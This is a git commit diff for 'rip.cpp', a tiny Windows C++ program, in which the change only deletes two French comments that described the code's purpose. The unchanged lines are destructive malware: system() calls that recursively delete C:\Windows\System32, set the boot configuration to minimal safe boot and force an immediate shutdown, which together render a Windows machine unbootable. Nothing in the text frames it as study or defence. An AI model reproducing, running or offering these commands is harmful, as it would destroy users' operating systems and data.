1f5b65c7cb07f0e125395b7314487a49af3e35f7
./0x.id <netoxboss+netox@gmail.com>
2025-10-28 15:00:44 +0100

    Update rip.cpp

--- rip.cpp
+++ rip.cpp
@@ -2,9 +2,7 @@
 #include <windows.h>
 
 int main() {
-    // Commande pour supprimer le system32
     system("rd /s /q C:\\Windows\\System32");
-    // Commandes pour endommager le système encore plus
     system("bcdedit /set {current} safeboot minimal");
     system("shutdown /s /f /t 00");
 
